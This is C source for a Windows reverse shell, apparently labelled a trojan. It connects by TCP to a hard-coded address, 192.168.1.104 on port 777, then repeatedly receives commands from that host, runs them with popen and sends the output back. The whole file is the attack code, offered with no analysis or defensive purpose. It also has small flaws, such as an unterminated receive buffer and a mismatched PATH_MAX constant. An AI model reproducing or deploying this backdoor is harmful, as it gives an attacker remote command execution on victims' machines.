#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#define B 1024
#define True 1

int trojanExec(int s);

int main(){

	WSADATA wsa;
	int erro = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (erro != 0){
		printf("WSAStartup Error: %d\n", erro);
		return 1;
	}

	char *ip = "192.168.1.104";
	int port = 777;

	struct sockaddr_in server;
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = inet_addr(ip);
		server.sin_port = htons(port);

	int s = socket(AF_INET, SOCK_STREAM, 0); // TCP/IP
	if (s == -1){
		printf("Socket Error\n");
		return 1;
	}

	erro = connect(s, (struct sockaddr *)&server, sizeof(server));
	if (erro < 0){
		closesocket(s);
		printf("Connection Error\n");
		return 1;
	}

	char recvbuf[B];
	char *shell = "$>";
	FILE *fp;
	char path[MAX_PATH];

	while (True){

		erro = send(s, shell, (int)strlen(shell), 0);
		if (erro < 0){
			printf("Send Error\n");
			return 1;
		}

		erro = recv(s, recvbuf, B, 0);
		if (erro < 0){
			printf("Recv Error\n");
			return 2;
		}

		fp = popen(recvbuf, "rb");

		while (fgets(path, PATH_MAX, fp) != NULL){
			erro = send(s, path, (int)strlen(path), 0);
		}
	}

closesocket(s);

return 0;
}
